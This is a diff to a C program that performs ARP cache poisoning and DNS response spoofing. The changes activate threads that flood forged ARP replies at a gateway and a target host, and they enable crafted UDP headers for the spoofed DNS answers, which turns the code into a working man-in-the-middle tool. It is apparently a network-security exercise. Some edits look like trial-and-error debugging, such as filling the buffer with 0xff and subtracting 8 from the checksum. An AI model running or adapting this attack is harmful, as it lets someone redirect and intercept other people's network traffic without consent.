@@ -31,7 +31,7 @@
 //#define INTERFACE_NAME "wlp2s0"
 
 #define GATEWAY_IP "192.168.0.1"
-#define TARGET_IP "192.168.0.4"
+#define TARGET_IP "192.168.0.6"
 //#define GATEWAY_IP "1.1.1.1"
 //#define TARGET_IP "8.8.8.8"
 //#define GATEWAY_IP "142.232.49.6"
@@ -345,7 +345,7 @@ void spoof_dns(int sock) {
 
     //Initial constant packet settings
     //Zero buffer for defaults
-    memset(buffer, 0, 65535);
+    memset(buffer, 0xff, 65535);
 
     eh->ether_type = htons(ETH_P_IP);
     memcpy(eh->ether_shost, gateway_mac, ETHER_ADDR_LEN);
@@ -370,19 +370,21 @@ void spoof_dns(int sock) {
         //ih->id = htons(ntohs(recv_ih->id) + 1);
         ih->id = recv_ih->id;
         ih->ttl = recv_ih->ttl;
+        ih->tos = 0;
+        ih->frag_off = 0;
         //Calculate ip checksum
         ih->check = 0;
         ih->check = csum((unsigned short*) ih, sizeof(struct iphdr));
 
-        uh->len = htons(data_len + sizeof(struct udphdr));
-#if 0
+#if 1
         //UDP stuffs
         uh->source = recv_uh->dest;
         uh->dest = recv_uh->source;
+        uh->len = htons(data_len + sizeof(struct udphdr));
 
         //Calculate udp checksum
-        //uh->check = udp_checksum(uh, data_len, ih->saddr, ih->daddr);
-        uh->check = htons(1337);
+        uh->check = 0;
+        uh->check = htons(ntohs(udp_checksum(uh, data_len, ih->saddr, ih->daddr)) - 8);
 #endif
 
         struct sockaddr_ll addr = {0};
@@ -441,7 +443,7 @@ int main(void) {
     printf("%02x %02x %02x %02x %02x %02x\n", target_mac[0], target_mac[1], target_mac[2],
             target_mac[3], target_mac[4], target_mac[5]);
 
-#if 0
+#if 1
     struct thread_arg ta;
     ta.sock = pack_sock;
     ta.victim_mac = gateway_mac;
@@ -450,14 +452,14 @@ int main(void) {
     pthread_t one;
     pthread_t two;
 
-    //pthread_create(&one, NULL, flood_arp, &ta);
+    pthread_create(&one, NULL, flood_arp, &ta);
 
     struct thread_arg tb;
     tb.sock = pack_sock;
     tb.victim_mac = target_mac;
     tb.victim_ip = target_ip;
 
-    //pthread_create(&two, NULL, &flood_arp, &tb);
+    pthread_create(&two, NULL, &flood_arp, &tb);
 #endif
 
     if (setsockopt(pack_sock, SOL_SOCKET, SO_ATTACH_FILTER, &port_filter, sizeof(port_filter))
@@ -469,8 +471,8 @@ int main(void) {
     spoof_dns(pack_sock);
 
 finish:
-    //pthread_join(one, NULL);
-    //pthread_join(two, NULL);
+    pthread_join(one, NULL);
+    pthread_join(two, NULL);
 
     close(pack_sock);
 
